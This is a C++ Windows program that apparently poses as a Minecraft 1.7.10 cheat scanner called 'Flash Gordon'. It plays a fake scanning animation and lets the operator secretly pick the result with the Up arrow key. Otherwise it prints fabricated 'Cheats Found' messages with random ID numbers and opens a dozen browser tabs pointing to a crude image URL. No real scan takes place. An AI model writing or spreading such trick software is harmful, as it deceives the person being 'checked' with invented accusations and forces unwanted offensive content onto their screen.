#include <iostream>
#include <Windows.h>
#include <cstdlib>

using namespace std;


DWORD pID;

int main()
{
	system("title Flash Gordon");
	HWND hwnd = FindWindowA(0, ("Minecraft 1.7.10"));
	if (!hwnd) cerr << "(!) Cannot locate Minecraft 1.7.10 (!)\n\n Please make sure it is running!\n\n" << endl;
	else
	{
		cout << "(+) Located Minecraft 1.7.10 (+)\n" << endl;
		cout << "Scanning";
		Sleep(300);
		cout << ".";
		Sleep(300);
		cout << ".";
		Sleep(300);
		cout << ".";
		Sleep(300);
		cout << ".";
		Sleep(300);
		cout << ".";
		Sleep(300);
		cout << ".";
		system("cls");
		cout << "(+) Located Minecraft 1.7.10 (+)\n" << endl;
		cout << "Scanning";
		Sleep(300);
		cout << ".";
		Sleep(300);
		cout << ".";
		Sleep(300);
		cout << ".";
		Sleep(300);
		cout << ".";
		Sleep(300);
		cout << ".";
		Sleep(300);
		cout << ".\n";
		system("cls");
		if (GetAsyncKeyState(VK_UP))
		{
			cout << "(+) Player is clean (+)" << endl;
			Sleep(1000);
			return(0);
		}
		for (int x = 1; x < 4; x++) {
			cout << "(!) Cheats Found with ID: #" << (rand()%2500) << " (!)\n" << endl;
			Sleep(1000);
		}
		ShellExecute(0, 0, L"https://naijaexclusive.net/wp-content/uploads/2016/05/baby-born-with-long-penis.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://yt3.ggpht.com/-o3YS7OLO-rI/AAAAAAAAAAI/AAAAAAAAAAA/2z6OFOtZgpo/s900-c-k-no-mo-rj-c0xffffff/photo.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://naijaexclusive.net/wp-content/uploads/2016/05/baby-born-with-long-penis.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://yt3.ggpht.com/-o3YS7OLO-rI/AAAAAAAAAAI/AAAAAAAAAAA/2z6OFOtZgpo/s900-c-k-no-mo-rj-c0xffffff/photo.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://naijaexclusive.net/wp-content/uploads/2016/05/baby-born-with-long-penis.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://yt3.ggpht.com/-o3YS7OLO-rI/AAAAAAAAAAI/AAAAAAAAAAA/2z6OFOtZgpo/s900-c-k-no-mo-rj-c0xffffff/photo.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://naijaexclusive.net/wp-content/uploads/2016/05/baby-born-with-long-penis.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://yt3.ggpht.com/-o3YS7OLO-rI/AAAAAAAAAAI/AAAAAAAAAAA/2z6OFOtZgpo/s900-c-k-no-mo-rj-c0xffffff/photo.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://naijaexclusive.net/wp-content/uploads/2016/05/baby-born-with-long-penis.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://yt3.ggpht.com/-o3YS7OLO-rI/AAAAAAAAAAI/AAAAAAAAAAA/2z6OFOtZgpo/s900-c-k-no-mo-rj-c0xffffff/photo.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://yt3.ggpht.com/-o3YS7OLO-rI/AAAAAAAAAAI/AAAAAAAAAAA/2z6OFOtZgpo/s900-c-k-no-mo-rj-c0xffffff/photo.jpg", 0, 0, SW_SHOW);
		ShellExecute(0, 0, L"https://naijaexclusive.net/wp-content/uploads/2016/05/baby-born-with-long-penis.jpg", 0, 0, SW_SHOW);
		system("pause");
		exit(0);
	}

	GetWindowThreadProcessId(hwnd, &pID);
	HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
	if (!pHandle) cerr << "(!) Error obtaining Process ID (!)\n\n Try running as administrator\n\n" << endl;

	system("pause");
	return 0;
}